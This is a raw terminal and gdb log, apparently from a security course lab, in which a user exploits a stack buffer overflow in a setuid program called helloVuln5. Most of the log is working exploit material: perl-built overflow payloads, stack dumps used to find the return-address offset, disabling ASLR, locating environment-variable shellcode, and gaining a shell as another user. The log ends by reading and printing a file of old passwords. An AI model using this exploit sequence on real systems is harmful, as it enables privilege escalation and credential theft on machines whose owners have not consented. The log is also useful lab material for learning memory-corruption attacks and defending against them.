The program being debugged has been started already.
Start it from the beginning? (y or n) n
Program not restarted.
(gdb) x/124wx $ebp - 0xc - 20
0xbfb7ce08:     0xb7f38000      0x00000000      0x00000000      0x00000000
0xbfb7ce18:     0x00000000      0x00000028      0x00000000      0xb7e50b66
0xbfb7ce28:     0xbfb7ce58      0x0804873b      0xbfb7e6f6      0x000003ee
0xbfb7ce38:     0xbfb7ce58      0x080486f4      0x00000002      0xbfb7cf04
0xbfb7ce48:     0xbfb7cf10      0x08048888      0xbfb7ce70      0x00000000
0xbfb7ce58:     0x00000000      0xb7d78f21      0xb7f38000      0xb7f38000
0xbfb7ce68:     0x00000000      0xb7d78f21      0x00000002      0xbfb7cf04
0xbfb7ce78:     0xbfb7cf10      0xbfb7ce94      0x00000001      0x00000000
0xbfb7ce88:     0xb7f38000      0xb7f6b76a      0xb7f83000      0x00000000
0xbfb7ce98:     0xb7f38000      0x00000000      0x00000000      0xfbc54b22
0xbfb7cea8:     0x3b446d32      0x00000000      0x00000000      0x00000000
0xbfb7ceb8:     0x00000002      0x080484e0      0x00000000      0xb7f70e30
0xbfb7cec8:     0xb7f6b9c0      0x0804a000      0x00000002      0x080484e0
0xbfb7ced8:     0x00000000      0x08048512      0x080486d4      0x00000002
0xbfb7cee8:     0xbfb7cf04      0x08048750      0x080487b0      0xb7f6b9c0
0xbfb7cef8:     0xbfb7cefc      0xb7f83940      0x00000002      0xbfb7e6d6
0xbfb7cf08:     0xbfb7e6f6      0x00000000      0xbfb7e715      0xbfb7ed01
0xbfb7cf18:     0xbfb7ed35      0xbfb7ed57      0xbfb7ed66      0xbfb7ed77
0xbfb7cf28:     0xbfb7ed8b      0xbfb7ed9e      0xbfb7edaa      0xbfb7edcc
0xbfb7cf38:     0xbfb7eded      0xbfb7ee06      0xbfb7ee18      0xbfb7ee3a
0xbfb7cf48:     0xbfb7ee7b      0xbfb7ee8e      0xbfb7eea4      0xbfb7eeb4
0xbfb7cf58:     0xbfb7eebf      0xbfb7eec7      0xbfb7eed6      0xbfb7ef0c
0xbfb7cf68:     0xbfb7ef2b      0xbfb7efbc      0x00000000      0x00000020
0xbfb7cf78:     0xb7f5ad00      0x00000021      0xb7f5a000      0x00000010
0xbfb7cf88:     0x1f8bfbff      0x00000006      0x00001000      0x00000011
0xbfb7cf98:     0x00000064      0x00000003      0x08048034      0x00000004
0xbfb7cfa8:     0x00000020      0x00000005      0x00000009      0x00000007
0xbfb7cfb8:     0xb7f5c000      0x00000008      0x00000000      0x00000009
0xbfb7cfc8:     0x080484e0      0x0000000b      0x000003ec      0x0000000c
0xbfb7cfd8:     0x000003ec      0x0000000d      0x000003ec      0x0000000e
0xbfb7cfe8:     0x000003ec      0x00000017      0x00000001      0x00000019
(gdb) cont
Continuing.

Breakpoint 3, 0x080486ba in vulnFunction ()
1: environ = (char **) 0xbfb7cf10
(gdb) x/124wx $ebp - 0xc - 20
0xbfb7ce08:     0xb7f38000      0x41414141      0x41414141      0x41414141
0xbfb7ce18:     0x41414141      0x41414141      0xefef4141      0x9db4efef
0xbfb7ce28:     0xbf00bfbf      0x0804873b      0xbfb7e6f6      0x000003ee
0xbfb7ce38:     0xbfb7ce58      0x080486f4      0x00000002      0xbfb7cf04
0xbfb7ce48:     0xbfb7cf10      0x08048888      0xbfb7ce70      0x00000000
0xbfb7ce58:     0x00000000      0xb7d78f21      0xb7f38000      0xb7f38000
0xbfb7ce68:     0x00000000      0xb7d78f21      0x00000002      0xbfb7cf04
0xbfb7ce78:     0xbfb7cf10      0xbfb7ce94      0x00000001      0x00000000
0xbfb7ce88:     0xb7f38000      0xb7f6b76a      0xb7f83000      0x00000000
0xbfb7ce98:     0xb7f38000      0x00000000      0x00000000      0xfbc54b22
0xbfb7cea8:     0x3b446d32      0x00000000      0x00000000      0x00000000
0xbfb7ceb8:     0x00000002      0x080484e0      0x00000000      0xb7f70e30
0xbfb7cec8:     0xb7f6b9c0      0x0804a000      0x00000002      0x080484e0
0xbfb7ced8:     0x00000000      0x08048512      0x080486d4      0x00000002
0xbfb7cee8:     0xbfb7cf04      0x08048750      0x080487b0      0xb7f6b9c0
0xbfb7cef8:     0xbfb7cefc      0xb7f83940      0x00000002      0xbfb7e6d6
0xbfb7cf08:     0xbfb7e6f6      0x00000000      0xbfb7e715      0xbfb7ed01
0xbfb7cf18:     0xbfb7ed35      0xbfb7ed57      0xbfb7ed66      0xbfb7ed77
0xbfb7cf28:     0xbfb7ed8b      0xbfb7ed9e      0xbfb7edaa      0xbfb7edcc
0xbfb7cf38:     0xbfb7eded      0xbfb7ee06      0xbfb7ee18      0xbfb7ee3a
0xbfb7cf48:     0xbfb7ee7b      0xbfb7ee8e      0xbfb7eea4      0xbfb7eeb4
0xbfb7cf58:     0xbfb7eebf      0xbfb7eec7      0xbfb7eed6      0xbfb7ef0c
0xbfb7cf68:     0xbfb7ef2b      0xbfb7efbc      0x00000000      0x00000020
0xbfb7cf78:     0xb7f5ad00      0x00000021      0xb7f5a000      0x00000010
0xbfb7cf88:     0x1f8bfbff      0x00000006      0x00001000      0x00000011
0xbfb7cf98:     0x00000064      0x00000003      0x08048034      0x00000004
0xbfb7cfa8:     0x00000020      0x00000005      0x00000009      0x00000007
0xbfb7cfb8:     0xb7f5c000      0x00000008      0x00000000      0x00000009
0xbfb7cfc8:     0x080484e0      0x0000000b      0x000003ec      0x0000000c
0xbfb7cfd8:     0x000003ec      0x0000000d      0x000003ec      0x0000000e
0xbfb7cfe8:     0x000003ec      0x00000017      0x00000001      0x00000019
(gdb) r $(perl -e 'print "A"x34 . "\xef\xef\xef\xef" . "\xb4\x9d\xbf\xbf"')
The program being debugged has been started already.
Start it from the beginning? (y or n) y
Starting program: /home/level2/Desktop/helloVuln5 $(perl -e 'print "A"x34 . "\xef\xef\xef\xef" . "\xb4\x9d\xbf\xbf"')

Breakpoint 1, 0x08048736 in main ()
1: environ = (char **) 0xbff33f00
(gdb) cont
Continuing.

Breakpoint 2, 0x08048652 in vulnFunction ()
1: environ = (char **) 0xbff33f00
(gdb) cont
Continuing.

Breakpoint 4, 0x0804867a in vulnFunction ()
1: environ = (char **) 0xbff33f00
(gdb) cont
Continuing.
Input too large!
Program terminated.

[Inferior 1 (process 27953) exited normally]
(gdb) r $(perl -e 'print "A"x32 . "\xef\xef\xef\xef" . "\xb4\x9d\xbf\xbf"')
Starting program: /home/level2/Desktop/helloVuln5 $(perl -e 'print "A"x32 . "\xef\xef\xef\xef" . "\xb4\x9d\xbf\xbf"')

Breakpoint 1, 0x08048736 in main ()
1: environ = (char **) 0xbfd01060
(gdb) cont
Continuing.

Breakpoint 2, 0x08048652 in vulnFunction ()
1: environ = (char **) 0xbfd01060
(gdb) cont
Continuing.

Breakpoint 4, 0x0804867a in vulnFunction ()
1: environ = (char **) 0xbfd01060
(gdb) cont
Continuing.
Input too large!
Program terminated.

[Inferior 1 (process 27958) exited normally]
(gdb) r $(perl -e 'print "A"x30 . "\xef\xef\xef\xef" . "\xb4\x9d\xbf\xbf"')
Starting program: /home/level2/Desktop/helloVuln5 $(perl -e 'print "A"x30 . "\xef\xef\xef\xef" . "\xb4\x9d\xbf\xbf"')

Breakpoint 1, 0x08048736 in main ()
1: environ = (char **) 0xbffd1620
(gdb) cont
Continuing.

Breakpoint 2, 0x08048652 in vulnFunction ()
1: environ = (char **) 0xbffd1620
(gdb) cont
Continuing.

Breakpoint 4, 0x0804867a in vulnFunction ()
1: environ = (char **) 0xbffd1620
(gdb) cont
Continuing.

Breakpoint 3, 0x080486ba in vulnFunction ()
1: environ = (char **) 0xbffd1620
(gdb) x/124wx $ebp - 0xc - 20
0xbffd1518:     0xb7f1f000      0x41414141      0x41414141      0x41414141
0xbffd1528:     0x41414141      0x41414141      0x41414141      0x41414141
0xbffd1538:     0xefef4141      0x9db4efef      0xbf00bfbf      0x000003ee
0xbffd1548:     0xbffd1568      0x080486f4      0x00000002      0xbffd1614
0xbffd1558:     0xbffd1620      0x08048888      0xbffd1580      0x00000000
0xbffd1568:     0x00000000      0xb7d5ff21      0xb7f1f000      0xb7f1f000
0xbffd1578:     0x00000000      0xb7d5ff21      0x00000002      0xbffd1614
0xbffd1588:     0xbffd1620      0xbffd15a4      0x00000001      0x00000000
0xbffd1598:     0xb7f1f000      0xb7f5276a      0xb7f6a000      0x00000000
0xbffd15a8:     0xb7f1f000      0x00000000      0x00000000      0x6aab0b45
0xbffd15b8:     0x3b7dcd55      0x00000000      0x00000000      0x00000000
0xbffd15c8:     0x00000002      0x080484e0      0x00000000      0xb7f57e30
0xbffd15d8:     0xb7f529c0      0x0804a000      0x00000002      0x080484e0
0xbffd15e8:     0x00000000      0x08048512      0x080486d4      0x00000002
0xbffd15f8:     0xbffd1614      0x08048750      0x080487b0      0xb7f529c0
0xbffd1608:     0xbffd160c      0xb7f6a940      0x00000002      0xbffd26ce
0xbffd1618:     0xbffd26ee      0x00000000      0xbffd2715      0xbffd2d01
0xbffd1628:     0xbffd2d35      0xbffd2d57      0xbffd2d66      0xbffd2d77
0xbffd1638:     0xbffd2d8b      0xbffd2d9e      0xbffd2daa      0xbffd2dcc
0xbffd1648:     0xbffd2ded      0xbffd2e06      0xbffd2e18      0xbffd2e3a
0xbffd1658:     0xbffd2e7b      0xbffd2e8e      0xbffd2ea4      0xbffd2eb4
0xbffd1668:     0xbffd2ebf      0xbffd2ec7      0xbffd2ed6      0xbffd2f0c
0xbffd1678:     0xbffd2f2b      0xbffd2fbc      0x00000000      0x00000020
0xbffd1688:     0xb7f41d00      0x00000021      0xb7f41000      0x00000010
0xbffd1698:     0x1f8bfbff      0x00000006      0x00001000      0x00000011
0xbffd16a8:     0x00000064      0x00000003      0x08048034      0x00000004
0xbffd16b8:     0x00000020      0x00000005      0x00000009      0x00000007
0xbffd16c8:     0xb7f43000      0x00000008      0x00000000      0x00000009
0xbffd16d8:     0x080484e0      0x0000000b      0x000003ec      0x0000000c
0xbffd16e8:     0x000003ec      0x0000000d      0x000003ec      0x0000000e
0xbffd16f8:     0x000003ec      0x00000017      0x00000001      0x00000019
(gdb) r $(perl -e 'print "A"x30  . "\xb4\x9d\xbf\xbf"')
The program being debugged has been started already.
Start it from the beginning? (y or n) y
Starting program: /home/level2/Desktop/helloVuln5 $(perl -e 'print "A"x30  . "\xb4\x9d\xbf\xbf"')

Breakpoint 1, 0x08048736 in main ()
1: environ = (char **) 0xbff8b360
(gdb) cont
Continuing.

Breakpoint 2, 0x08048652 in vulnFunction ()
1: environ = (char **) 0xbff8b360
(gdb) cont
Continuing.

Breakpoint 4, 0x0804867a in vulnFunction ()
1: environ = (char **) 0xbff8b360
(gdb) cont
Continuing.

Breakpoint 3, 0x080486ba in vulnFunction ()
1: environ = (char **) 0xbff8b360
(gdb) x/124wx $ebp - 0xc - 20
0xbff8b258:     0xb7f31000      0x41414141      0x41414141      0x41414141
0xbff8b268:     0x41414141      0x41414141      0x41414141      0x41414141
0xbff8b278:     0x9db44141      0x0800bfbf      0xbff8b6f2      0x000003ee
0xbff8b288:     0xbff8b2a8      0x080486f4      0x00000002      0xbff8b354
0xbff8b298:     0xbff8b360      0x08048888      0xbff8b2c0      0x00000000
0xbff8b2a8:     0x00000000      0xb7d71f21      0xb7f31000      0xb7f31000
0xbff8b2b8:     0x00000000      0xb7d71f21      0x00000002      0xbff8b354
0xbff8b2c8:     0xbff8b360      0xbff8b2e4      0x00000001      0x00000000
0xbff8b2d8:     0xb7f31000      0xb7f6476a      0xb7f7c000      0x00000000
0xbff8b2e8:     0xb7f31000      0x00000000      0x00000000      0x109a3fc9
0xbff8b2f8:     0x4fc279d9      0x00000000      0x00000000      0x00000000
0xbff8b308:     0x00000002      0x080484e0      0x00000000      0xb7f69e30
0xbff8b318:     0xb7f649c0      0x0804a000      0x00000002      0x080484e0
0xbff8b328:     0x00000000      0x08048512      0x080486d4      0x00000002
0xbff8b338:     0xbff8b354      0x08048750      0x080487b0      0xb7f649c0
0xbff8b348:     0xbff8b34c      0xb7f7c940      0x00000002      0xbff8b6d2
0xbff8b358:     0xbff8b6f2      0x00000000      0xbff8b715      0xbff8bd01
0xbff8b368:     0xbff8bd35      0xbff8bd57      0xbff8bd66      0xbff8bd77
0xbff8b378:     0xbff8bd8b      0xbff8bd9e      0xbff8bdaa      0xbff8bdcc
0xbff8b388:     0xbff8bded      0xbff8be06      0xbff8be18      0xbff8be3a
0xbff8b398:     0xbff8be7b      0xbff8be8e      0xbff8bea4      0xbff8beb4
0xbff8b3a8:     0xbff8bebf      0xbff8bec7      0xbff8bed6      0xbff8bf0c
0xbff8b3b8:     0xbff8bf2b      0xbff8bfbc      0x00000000      0x00000020
0xbff8b3c8:     0xb7f53d00      0x00000021      0xb7f53000      0x00000010
0xbff8b3d8:     0x1f8bfbff      0x00000006      0x00001000      0x00000011
0xbff8b3e8:     0x00000064      0x00000003      0x08048034      0x00000004
0xbff8b3f8:     0x00000020      0x00000005      0x00000009      0x00000007
0xbff8b408:     0xb7f55000      0x00000008      0x00000000      0x00000009
0xbff8b418:     0x080484e0      0x0000000b      0x000003ec      0x0000000c
0xbff8b428:     0x000003ec      0x0000000d      0x000003ec      0x0000000e
0xbff8b438:     0x000003ec      0x00000017      0x00000001      0x00000019
(gdb) r $(perl -e 'print "A"x32  . "\xb4\x9d\xbf\xbf"')
The program being debugged has been started already.
Start it from the beginning? (y or n) y
Starting program: /home/level2/Desktop/helloVuln5 $(perl -e 'print "A"x32  . "\xb4\x9d\xbf\xbf"')

Breakpoint 1, 0x08048736 in main ()
1: environ = (char **) 0xbf9a53a0
(gdb) cont
Continuing.

Breakpoint 2, 0x08048652 in vulnFunction ()
1: environ = (char **) 0xbf9a53a0
(gdb) cont
Continuing.

Breakpoint 4, 0x0804867a in vulnFunction ()
1: environ = (char **) 0xbf9a53a0
(gdb) x/124wx $ebp - 0xc - 20
0xbf9a5298:     0xb7f3b000      0x00000000      0x00000000      0x00000000
0xbf9a52a8:     0x00000000      0x00000028      0x00000000      0xb7e53b66
0xbf9a52b8:     0xbf9a52e8      0x0804873b      0xbf9a56f0      0x000003ee
0xbf9a52c8:     0xbf9a52e8      0x080486f4      0x00000002      0xbf9a5394
0xbf9a52d8:     0xbf9a53a0      0x08048888      0xbf9a5300      0x00000000
0xbf9a52e8:     0x00000000      0xb7d7bf21      0xb7f3b000      0xb7f3b000
0xbf9a52f8:     0x00000000      0xb7d7bf21      0x00000002      0xbf9a5394
0xbf9a5308:     0xbf9a53a0      0xbf9a5324      0x00000001      0x00000000
0xbf9a5318:     0xb7f3b000      0xb7f6e76a      0xb7f86000      0x00000000
0xbf9a5328:     0xb7f3b000      0x00000000      0x00000000      0x8f67a342
0xbf9a5338:     0x14bc6552      0x00000000      0x00000000      0x00000000
0xbf9a5348:     0x00000002      0x080484e0      0x00000000      0xb7f73e30
0xbf9a5358:     0xb7f6e9c0      0x0804a000      0x00000002      0x080484e0
0xbf9a5368:     0x00000000      0x08048512      0x080486d4      0x00000002
0xbf9a5378:     0xbf9a5394      0x08048750      0x080487b0      0xb7f6e9c0
0xbf9a5388:     0xbf9a538c      0xb7f86940      0x00000002      0xbf9a56d0
0xbf9a5398:     0xbf9a56f0      0x00000000      0xbf9a5715      0xbf9a5d01
0xbf9a53a8:     0xbf9a5d35      0xbf9a5d57      0xbf9a5d66      0xbf9a5d77
0xbf9a53b8:     0xbf9a5d8b      0xbf9a5d9e      0xbf9a5daa      0xbf9a5dcc
0xbf9a53c8:     0xbf9a5ded      0xbf9a5e06      0xbf9a5e18      0xbf9a5e3a
0xbf9a53d8:     0xbf9a5e7b      0xbf9a5e8e      0xbf9a5ea4      0xbf9a5eb4
0xbf9a53e8:     0xbf9a5ebf      0xbf9a5ec7      0xbf9a5ed6      0xbf9a5f0c
0xbf9a53f8:     0xbf9a5f2b      0xbf9a5fbc      0x00000000      0x00000020
0xbf9a5408:     0xb7f5dd00      0x00000021      0xb7f5d000      0x00000010
0xbf9a5418:     0x1f8bfbff      0x00000006      0x00001000      0x00000011
0xbf9a5428:     0x00000064      0x00000003      0x08048034      0x00000004
0xbf9a5438:     0x00000020      0x00000005      0x00000009      0x00000007
0xbf9a5448:     0xb7f5f000      0x00000008      0x00000000      0x00000009
0xbf9a5458:     0x080484e0      0x0000000b      0x000003ec      0x0000000c
0xbf9a5468:     0x000003ec      0x0000000d      0x000003ec      0x0000000e
0xbf9a5478:     0x000003ec      0x00000017      0x00000001      0x00000019
(gdb) cont
Continuing.

Breakpoint 3, 0x080486ba in vulnFunction ()
1: environ = (char **) 0xbf9a53a0
(gdb) x/124wx $ebp - 0xc - 20
0xbf9a5298:     0xb7f3b000      0x41414141      0x41414141      0x41414141
0xbf9a52a8:     0x41414141      0x41414141      0x41414141      0x41414141
0xbf9a52b8:     0x41414141      0xbfbf9db4      0xbf9a5600      0x000003ee
0xbf9a52c8:     0xbf9a52e8      0x080486f4      0x00000002      0xbf9a5394
0xbf9a52d8:     0xbf9a53a0      0x08048888      0xbf9a5300      0x00000000
0xbf9a52e8:     0x00000000      0xb7d7bf21      0xb7f3b000      0xb7f3b000
0xbf9a52f8:     0x00000000      0xb7d7bf21      0x00000002      0xbf9a5394
0xbf9a5308:     0xbf9a53a0      0xbf9a5324      0x00000001      0x00000000
0xbf9a5318:     0xb7f3b000      0xb7f6e76a      0xb7f86000      0x00000000
0xbf9a5328:     0xb7f3b000      0x00000000      0x00000000      0x8f67a342
0xbf9a5338:     0x14bc6552      0x00000000      0x00000000      0x00000000
0xbf9a5348:     0x00000002      0x080484e0      0x00000000      0xb7f73e30
0xbf9a5358:     0xb7f6e9c0      0x0804a000      0x00000002      0x080484e0
0xbf9a5368:     0x00000000      0x08048512      0x080486d4      0x00000002
0xbf9a5378:     0xbf9a5394      0x08048750      0x080487b0      0xb7f6e9c0
0xbf9a5388:     0xbf9a538c      0xb7f86940      0x00000002      0xbf9a56d0
0xbf9a5398:     0xbf9a56f0      0x00000000      0xbf9a5715      0xbf9a5d01
0xbf9a53a8:     0xbf9a5d35      0xbf9a5d57      0xbf9a5d66      0xbf9a5d77
0xbf9a53b8:     0xbf9a5d8b      0xbf9a5d9e      0xbf9a5daa      0xbf9a5dcc
0xbf9a53c8:     0xbf9a5ded      0xbf9a5e06      0xbf9a5e18      0xbf9a5e3a
0xbf9a53d8:     0xbf9a5e7b      0xbf9a5e8e      0xbf9a5ea4      0xbf9a5eb4
0xbf9a53e8:     0xbf9a5ebf      0xbf9a5ec7      0xbf9a5ed6      0xbf9a5f0c
0xbf9a53f8:     0xbf9a5f2b      0xbf9a5fbc      0x00000000      0x00000020
0xbf9a5408:     0xb7f5dd00      0x00000021      0xb7f5d000      0x00000010
0xbf9a5418:     0x1f8bfbff      0x00000006      0x00001000      0x00000011
0xbf9a5428:     0x00000064      0x00000003      0x08048034      0x00000004
0xbf9a5438:     0x00000020      0x00000005      0x00000009      0x00000007
0xbf9a5448:     0xb7f5f000      0x00000008      0x00000000      0x00000009
0xbf9a5458:     0x080484e0      0x0000000b      0x000003ec      0x0000000c
0xbf9a5468:     0x000003ec      0x0000000d      0x000003ec      0x0000000e
0xbf9a5478:     0x000003ec      0x00000017      0x00000001      0x00000019
(gdb) r $(perl -e 'print "A"x32  . "\xb4\x9d\xbf\xbf"')
The program being debugged has been started already.
Start it from the beginning? (y or n) n
Program not restarted.
(gdb) quit
A debugging session is active.

        Inferior 1 [process 27978] will be killed.

Quit anyway? (y or n) y
level2@CS647:~/Desktop$ $(perl -e 'print "A"x24 . "\xef\xef\xef\xef" .   "\xb4\x9d\xbf\xbf" . "\x90"x100')^C
level2@CS647:~/Desktop$ ./helloVuln5 $(perl -e 'print "0"x32  . "\xb4\x9d\xbf\xbf"')
Hello 00000000000000000000000000000000����!
Segmentation fault (core dumped)
level2@CS647:~/Desktop$ ./helloVuln5 $(perl -e 'print "0"x32  . "\xb0\x9d\xbf\xbf"')
Hello 00000000000000000000000000000000����!
Segmentation fault (core dumped)
level2@CS647:~/Desktop$ ./helloVuln5 $(perl -e 'print "0"x32  . "\xb1\x9d\xbf\xbf"')
Hello 00000000000000000000000000000000����!
Segmentation fault (core dumped)
level2@CS647:~/Desktop$ ./helloVuln5 $(perl -e 'print "0"x32  . "\xb2\x9d\xbf\xbf"')
Hello 00000000000000000000000000000000����!
Segmentation fault (core dumped)
level2@CS647:~/Desktop$ ./helloVuln5 $(perl -e 'print "0"x32  . "\xb3\x9d\xbf\xbf"')
Hello 00000000000000000000000000000000����!
Segmentation fault (core dumped)
level2@CS647:~/Desktop$ ./helloVuln5 $(perl -e 'print "0"x32  . "\xb4\x9d\xbf\xbf"')
Hello 00000000000000000000000000000000����!
Segmentation fault (core dumped)
level2@CS647:~/Desktop$ ./helloVuln5 $(perl -e 'print "0"x32  . "\xb5\x9d\xbf\xbf"')
Hello 00000000000000000000000000000000����!
Segmentation fault (core dumped)
level2@CS647:~/Desktop$ ./helloVuln5 $(perl -e 'print "0"x32  . "\xb6\x9d\xbf\xbf"')
Hello 00000000000000000000000000000000����!
Segmentation fault (core dumped)
level2@CS647:~/Desktop$ ./helloVuln5 $(perl -e 'print "0"x33  . "\xb6\x9d\xbf\xbf"')
Hello 000000000000000000000000000000000����!
Segmentation fault (core dumped)
level2@CS647:~/Desktop$ ./helloVuln5 $(perl -e 'print "0"x34  . "\xb6\x9d\xbf\xbf"')
Hello 0000000000000000000000000000000000����!
Segmentation fault (core dumped)
level2@CS647:~/Desktop$ ./helloVuln5 $(perl -e 'print "A0"x34  . "\xb6\x9d\xbf\xbf"')
Input too large!
Program terminated.

level2@CS647:~/Desktop$ ./helloVuln5 $(perl -e 'print "A"x34  . "\xb6\x9d\xbf\xbf"')
Hello AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA����!
Segmentation fault (core dumped)
level2@CS647:~/Desktop$ ./helloVuln5 $(perl -e 'print "A"x35  . "\xb6\x9d\xbf\xbf"')
Hello AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA����!
Segmentation fault (core dumped)
level2@CS647:~/Desktop$ ./helloVuln5 $(perl -e 'print "A"x36  . "\xb6\x9d\xbf\xbf"')
Input too large!
Program terminated.

level2@CS647:~/Desktop$ ./helloVuln5 $(perl -e 'print "A"x32  . "\xb6\x9d\xbf\xbf"')
Hello AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA����!
Segmentation fault (core dumped)
level2@CS647:~/Desktop$ ./helloVuln5 $(perl -e 'print "A"x32  . "\xb8\x9d\xbf\xbf"')
Hello AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA����!
Segmentation fault (core dumped)
level2@CS647:~/Desktop$ ./helloVuln5 $(perl -e 'print "A"x32  . "\xb9\x9d\xbf\xbf"')
Hello AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA����!
Segmentation fault (core dumped)
level2@CS647:~/Desktop$ ./helloVuln5 $(perl -e 'print "A"x32  . "\xc0\x9d\xbf\xbf"')
Hello AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA����!
Segmentation fault (core dumped)
level2@CS647:~/Desktop$ 
level2@CS647:~/Desktop$ 
level2@CS647:~/Desktop$ vi t.c
level2@CS647:~/Desktop$ mv t.c getEnvAddr.c
level2@CS647:~/Desktop$ toggleASLR 

ASLR is now disabled.
kernel.randomize_va_space = 0
level2@CS647:~/Desktop$ ./helloVuln5 $(perl -e 'print "A"x32  . "\xc0\x9d\xbf\xbf"')
Hello AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA����!
Segmentation fault (core dumped)
level2@CS647:~/Desktop$ ./helloVuln5 $(perl -e 'print "A"x32  . "\xc0\x9d\xbf\xbf"')
Hello AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA����!
Segmentation fault (core dumped)
level2@CS647:~/Desktop$ ./helloVuln5 $(perl -e 'print "A"x32  . "\xc0\x9d\xbf\xbf"')
Hello AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA����!
Segmentation fault (core dumped)
level2@CS647:~/Desktop$ gcc-5 -g -z execstack -fno-stack-protector -o getEnvAddr getEnvAddr.c
level2@CS647:~/Desktop$ ./getEnvAddr shellcode
Address of shellcode: 0xbffffdb8
level2@CS647:~/Desktop$ ./helloVuln5 $(perl -e 'print "A"x32  . "\xb8\xfd\xbf\x^C"')
level2@CS647:~/Desktop$ ./helloVuln5 $(perl -e 'print "A"x32  . "\xb8\xfd\xff\xbf"')
Hello AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA����!
$ ls -alt
total 56
-rwxrwxr-x  1 level2     level2     8352 Mar 11 14:58 getEnvAddr
drwxr-xr-x  2 level2     level2     4096 Mar 11 14:58 .
drwx------ 17 level2     level2     4096 Mar 11 14:57 ..
-rw-rw-r--  1 level2     level2      256 Mar 11 14:57 getEnvAddr.c
-rw-rw-r--  1 level2     level2     2304 Mar 11 12:23 env2
-rw-rw-r--  1 level2     level2     2247 Mar 11 12:22 env1
-rw-rw-r--  1 level2     level2      935 Feb 27 19:56 README
-rw-r--r--  1 level2     level2       23 Jan 10 23:55 shell.bin
-rw-r-----  1 level3     level3      133 Jan 10 23:34 oldpasswords.txt
-rwsr-xr-x  1 level3     level3     7672 Jan 10 23:33 helloVuln5
-rw-r--r--  1 heisenburg heisenburg  613 Jan 10 23:33 README.enc
$ cat oldpasswords.txt
Old passwords:

qwerty123
password2
keyboardwalk
zxcvbnm,asdfghjkl;qwertyuiop
correcthorsebatterystaple
level3password
Giso9l6b5h8R

$ history | grep perl
sh: 3: history: not found
$ exit
level2@CS647:~/Desktop$ history | grep perl
   49  ./helloVuln5 $(perl -e 'print 'A'x10)
   50  ./helloVuln5 $(perl -e 'print "A"x10')
   51  ./helloVuln5 $(perl -e 'print "A"x20')
   52  ./helloVuln5 $(perl -e 'print "A"x21')
   53  ./helloVuln5 $(perl -e 'print "A"x22')
   54  ./helloVuln5 $(perl -e 'print "A"x26')
   55  ./helloVuln5 $(perl -e 'print "A"x28')
   56  ./helloVuln5 $(perl -e 'print "A"x29')
   57  ./helloVuln5 $(perl -e 'print "A"x30')
   58  ./helloVuln5 $(perl -e 'print "A"x50')
   76  ./helloVuln5 $(perl -e 'print "A"x50')
   77  ./helloVuln5 $(perl -e 'print "A"x30')
   92  ./helloVuln5 $(perl -e 'print "A"x30')
  105  ./helloVuln5 $(perl -e 'print "A"x38')
  106  ./helloVuln5 $(perl -e 'print "A"x40')
  107  ./helloVuln5 $(perl -e 'print "A"x39')
  108  ./helloVuln5 $(perl -e 'print "A"x39 . "0"')
  109  ./helloVuln5 $(perl -e 'print "A"x39 . "\0"')
  110  ./helloVuln5 $(perl -e 'print "A"x39 . "\\0"')
  111  ./helloVuln5 $(perl -e 'print "A"x39 . "\0"')
  112  ./helloVuln5 $(perl -e 'print "A"x39 . "0"')
  113  ./helloVuln5 $(perl -e 'print "A"x39 . "\z00"')
  114  ./helloVuln5 $(perl -e 'print "A"x39 . "\x00"')
  115  ./helloVuln5 $(perl -e 'print "A"x39 . "\x00" . "A"x10')
  116  ./helloVuln5 $(perl -e 'print "A"x39 . "\x00"x4  . "A"x10')
  117  ./helloVuln5 $(perl -e 'print "A"x39 . "\x00"x8  . "A"x10')
  118  ./helloVuln5 $(perl -e 'print "A"x39 . "\x00"x8')
  119  ./helloVuln5 $(perl -e 'print "A"x39')
  121  ./helloVuln5 $(perl -e 'print "A"x39')
  126  ./helloVuln5 $(perl -e 'print "A"x39')
  130  ./helloVuln5 $(perl -e 'print "A"x39')
  155  ./helloVuln5 $(perl -e 'print "A"x39')
  173  ./helloVuln5 $(perl -e 'print "A"x39')
  174  ./helloVuln5 $(perl -e 'print "A"x40')
  177  ./helloVuln5 $(perl -e 'print "A"x28')
  178  ./helloVuln5 $(perl -e 'print "A"x20')
  179  ./helloVuln5 $(perl -e 'print "A"x24')
  180  ./helloVuln5 $(perl -e 'print "A"x28')
  206  history |grep perl
  207  ./helloVuln5 $(perl -e 'print "A"x39 . "\x00"x8  . "A"x10')
  208  ./helloVuln5 $(perl -e 'print "A"x39 . "\x00"x1000  . "A"x10')
  209  ./helloVuln5 $(perl -e 'print "A"x38 . "\x00"x1000  . "A"x10')
  215  ./helloVuln5 $(perl -e 'print "0"x32  . "\xb4\x9d\xbf\xbf"')
  216  ./helloVuln5 $(perl -e 'print "0"x32  . "\xb0\x9d\xbf\xbf"')
  217  ./helloVuln5 $(perl -e 'print "0"x32  . "\xb1\x9d\xbf\xbf"')
  218  ./helloVuln5 $(perl -e 'print "0"x32  . "\xb2\x9d\xbf\xbf"')
  219  ./helloVuln5 $(perl -e 'print "0"x32  . "\xb3\x9d\xbf\xbf"')
  220  ./helloVuln5 $(perl -e 'print "0"x32  . "\xb4\x9d\xbf\xbf"')
  221  ./helloVuln5 $(perl -e 'print "0"x32  . "\xb5\x9d\xbf\xbf"')
  222  ./helloVuln5 $(perl -e 'print "0"x32  . "\xb6\x9d\xbf\xbf"')
  223  ./helloVuln5 $(perl -e 'print "0"x33  . "\xb6\x9d\xbf\xbf"')
  224  ./helloVuln5 $(perl -e 'print "0"x34  . "\xb6\x9d\xbf\xbf"')
  225  ./helloVuln5 $(perl -e 'print "A0"x34  . "\xb6\x9d\xbf\xbf"')
  226  ./helloVuln5 $(perl -e 'print "A"x34  . "\xb6\x9d\xbf\xbf"')
  227  ./helloVuln5 $(perl -e 'print "A"x35  . "\xb6\x9d\xbf\xbf"')
  228  ./helloVuln5 $(perl -e 'print "A"x36  . "\xb6\x9d\xbf\xbf"')
  229  ./helloVuln5 $(perl -e 'print "A"x32  . "\xb6\x9d\xbf\xbf"')
  230  ./helloVuln5 $(perl -e 'print "A"x32  . "\xb8\x9d\xbf\xbf"')
